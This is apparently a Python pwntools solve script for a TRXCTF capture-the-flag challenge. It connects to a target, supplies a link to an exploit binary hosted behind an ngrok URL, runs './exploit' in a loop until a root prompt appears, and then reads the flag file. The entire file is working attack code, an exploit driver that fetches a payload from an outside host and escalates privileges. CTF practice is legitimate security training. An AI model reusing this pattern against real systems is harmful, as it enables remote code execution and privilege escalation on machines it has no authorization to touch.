from pwn import *
import sys

ip = sys.argv[1]
ngrok = sys.argv[2]

nc = "nc " + ip + " 7006"
nc = nc.split()
exp_link = ngrok.encode() + b"/exploit"
hashcash_key = b"ABELLOTHEGOONER"
n = 1

while(True):
    io = remote(nc[1], int(nc[2]))
    context.log_level = "debug"

    io.sendline(hashcash_key)
    io.sendline(exp_link)
    io.sendlineafter(b"$ ", "./exploit")
    worked = io.recvuntil(b"# ", timeout=1)
    
    if worked != b"":
        break
    
    io.close()
    n += 1


io.sendline(b"cat flag")
io.recvuntil(b"TRXCTF{")
flag = io.recvuntil(b"}")

print(b"TRXCTF{" + flag)
print(n)

io.close()
